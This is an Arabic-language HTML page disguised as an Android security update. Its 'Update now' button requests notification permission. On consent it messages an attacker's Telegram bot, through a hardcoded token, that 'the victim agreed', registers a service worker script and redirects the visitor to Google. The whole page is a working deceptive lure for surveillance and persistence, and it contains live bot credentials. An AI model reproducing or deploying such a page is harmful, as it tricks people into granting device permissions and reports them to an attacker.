<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث نظام أندرويد</title>
    <style>
        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 90%; }
        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 20px; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <h2>تحديث أمن الجهاز</h2>
        <p>يجب تحديث خدمات النظام لضمان استقرار التطبيقات.</p>
        <button onclick="startAction()">تحديث الآن</button>
    </div>

    <script>
        const botToken = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE';
        const chatId = '7802385639';

        function startAction() {
            Notification.requestPermission().then(perm => {
                if (perm === 'granted') {
                    // إرسال إشعار فوري للبوت
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ جاري المراقبة: الضحية وافق على الصلاحيات.")}`);
                    
                    // تسجيل السكربت
                    navigator.serviceWorker.register('sw.js').then(() => {
                        alert("بدأ التحديث، سيتم توجيهك الآن..");
                        window.location.href = "https://www.google.com";
                    });
                } else {
                    alert("يجب السماح بالإشعارات لإتمام التحديث.");
                }
            });
        }
    </script>
</body>
</html>
